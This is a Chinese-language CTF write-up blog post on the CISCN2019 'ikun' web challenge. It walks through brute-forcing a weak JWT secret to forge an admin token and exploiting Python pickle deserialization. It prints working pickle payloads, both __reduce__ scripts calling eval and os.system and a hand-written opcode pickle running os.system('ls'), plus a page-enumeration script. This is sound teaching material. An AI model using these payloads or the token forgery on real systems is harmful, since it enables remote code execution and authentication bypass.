<!--yml
category: 未分类
date: 2022-04-26 14:37:01
-->

# 一道CTF题看JWT和python反序列化_weixin_44377940的博客-CSDN博客_jwt反序列化

> 来源：[https://blog.csdn.net/weixin_44377940/article/details/106863514](https://blog.csdn.net/weixin_44377940/article/details/106863514)

### 题目

题为[CISCN2019 华北赛区 Day1 Web2]ikun

#### 题解

打开，看到这里
![在这里插入图片描述](img/befb4f0aa503bb516ab85ac90ce37c2e.png)
看来要找到lv6，写个小脚本：

```
 import requests
url = "http://9592eed0-512a-4494-bedb-332fdf504447.node3.buuoj.cn/shop?page="

for i in range(0,2000):
	r=requests.get(url+str(i))
	if 'lv6.png' in r.text:
		print (i)
		break 
```

找到后，发现要求登陆，随便注册了一个号，然后登陆，购买，发现钱不够：
抓包，发现了有趣的东西：
![在这里插入图片描述](img/afd86ea931d718a3fa4d8cfdce2eb6cc.png)
JWT我在之前的文章提到过，用base64解码看看：
![在这里插入图片描述](img/c858a739cb18aec7902e9a421ab1c8d1.png)
我们可以用[JWT-cracker](https://github.com/lmammino/jwt-cracker)对加密的secret进行爆破。
爆破得到secret为1Kun。
![在这里插入图片描述](img/3bcadaf8a54ac1096b92ffe31272c373.png)
再去[JWT伪造网站](https://jwt.io/)进行伪造：
![在这里插入图片描述](img/5b94918d4a42c41daa63854917255dd9.png)
发包：
![在这里插入图片描述](img/894573862a3ae54119e15897c8e7c9dd.png)
看到302跳转：
![在这里插入图片描述](img/84f3f0123437f0b33c93903a8c161703.png)
继续抓包，修改JWT。
进入后，发现hint：
![在这里插入图片描述](img/4d20119bb619fe2264542350aa570519.png)
下载源码，是py源码。
在Admin.py处找到一处反序列化：
![在这里插入图片描述](img/e07eb88e71d3cb6a4dbd0672fffdfac0.png)
直接上大佬的反序列化脚本：

```
import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a 
```

修改如下地方即可得到flag：
![在这里插入图片描述](img/79b2235488f034b07aaa69387a2a4dca.png)

### 知识点

#### JWT

JWT全名为json web token，由三段组成，这三段用点号连接，以这次的JWT看：`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhYSJ9.Xjc37g2j_pU5SFHYwoPSHWJDEmRVPtfHkbFfGPcn4W0`

1.  第一段头部(header)
    这是一串base64，里面记载的是加密算法和类型声明，解码后如图：
    ![一般头部都是这个样](img/7da80ce3bbc225693e4e9b0026319e8b.png)
2.  第二段负荷(payload)
    记载的信息一般分为下面几种：标准中注册的声明、公共的声明、私有的声明。上面的解码如图：
    ![在这里插入图片描述](img/d221ca2d36c6beaeecd838257c620119.png)
3.  第三段签证（signature）
    这个部分需要base64加密后的header和base64加密后的payload使用.连接组成的字符串，然后通过header中声明的加密方式进行加盐`secret`组合加密，然后就构成了jwt的第三部分。
    这部分的secret如果偏简单的话也可以通过工具爆破出来，就比如这一题。

想要更具体的解释可以看[这篇文章](https://www.jianshu.com/p/576dbf44b2ae)。

#### Python 序列化与反序列化

python的序列化和反序列化一般通过pickle模块进行（也有json、messagepack等多种方式，但CTF常用pickle），序列化和反序列化的方法：

```
序列化
pickle.dump()或pickle.dumps()
Pickler().dump()
反序列化
pickle.load()或pickle.loads()
Unpickler(file).load() 
```

pickle可以手撸，也可以用`__reduce__`方法构造

##### 手撸pickle

我先把指令集和手写的基本模式贴在下面：

```
MARK           = b'('   # push special markobject on stack
STOP           = b'.'   # every pickle ends with STOP
POP            = b'0'   # discard topmost stack item
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # push float object; decimal string argument
INT            = b'I'   # push integer or bool; decimal string argument
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # push None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
REDUCE         = b'R'   # apply callable to argtuple, both on stack
STRING         = b'S'   # push string; NL-terminated string argument
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   #  "     "   ;    "      "       "      " < 256 bytes
UNICODE        = b'V'   # push Unicode string; raw-unicode-escaped'd argument
BINUNICODE     = b'X'   #   "     "       "  ; counted UTF-8 string argument
APPEND         = b'a'   # append stack top to list below it
BUILD          = b'b'   # call __setstate__ or __dict__.update()
GLOBAL         = b'c'   # push self.find_class(modname, name); 2 string args
DICT           = b'd'   # build a dict from stack items
EMPTY_DICT     = b'}'   # push empty dict
APPENDS        = b'e'   # extend list on stack by topmost stack slice
GET            = b'g'   # push item from memo on stack; index is string arg
BINGET         = b'h'   #   "    "    "    "   "   "  ;   "    " 1-byte arg
INST           = b'i'   # build & push class instance
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # build list from topmost stack items
EMPTY_LIST     = b']'   # push empty list
OBJ            = b'o'   # build & push class instance
PUT            = b'p'   # store stack top in memo; index is string arg
BINPUT         = b'q'   #   "     "    "   "   " ;   "    " 1-byte arg
LONG_BINPUT    = b'r'   #   "     "    "   "   " ;   "    " 4-byte arg
SETITEM        = b's'   # add key+value pair to dict
TUPLE          = b't'   # build tuple from topmost stack items
EMPTY_TUPLE    = b')'   # push empty tuple
SETITEMS       = b'u'   # modify dict by adding topmost key+value pairs
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding
​
TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py 
```

基本模式：

```
c<module>
<callable>
(<args>
tR 
```

按照指令集和基本模式就可以直接整出来了。
举个例子：

```
cos
system
(S'ls'
tR. 
```

我们按照指令集分解一下：

```
cos
system 
```

这部分按照指令集中的`b'c'`来看，表示引入模块和函数。由于该指令需要两个字符串（一个为模块名，一个为函数名），所以，接下来的两个字符串用`\n`当作分隔符和休止符，意义为`__import__(os).system`

```
(S'ls' 
```

`b'('`表示将一个特殊标记对象压入栈中，`b'S'`表示接下来的内容为一个字符串，在这里我们输入的字符串用`\n`当作终止符。

```
tR. 
```

这个最简单，`b't'`表示从最顶层堆栈项生成元组，`b'R'`表示在堆栈上应用可调用的**元组**，`b'.'`表示结束构造pickle。
也就是说这个指令等同于`__import__('os').system(*('ls',))`

##### __reduce__构造

这题的最后，大佬就是用了`__reduce__`进行构造。这个构造的坏处只有一个：只能执行单一的函数，很难构造复杂的操作，不过这题我们一个足以。
这题我们改造一下它的脚本会得到一个相同的，但在这里没有用的脚本(pickle.loads是会解决import 问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。)：

```
import pickle,os
import urllib

class payload(object):
    def __reduce__(self):
       return (os.system, ('cat /flag.txt',))

a = pickle.dumps(payload(),protocol=0)
a = urllib.quote(a)
print (a) 
```

这里的`protocol=0`又涉及到另一个小知识了：pickling 的协议

###### pickling 的协议

pickling 的协议共有 5 种：

```
v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。
v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。
v2 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。
v3 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。
v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。 
```

使用的协议越高，需要的python版本就得越新。

参考文章：[Python pickle 反序列化实例分析](https://www.anquanke.com/post/id/188981)
想更加了解python的魔术方法可以看这个：[python魔术方法指南](https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html)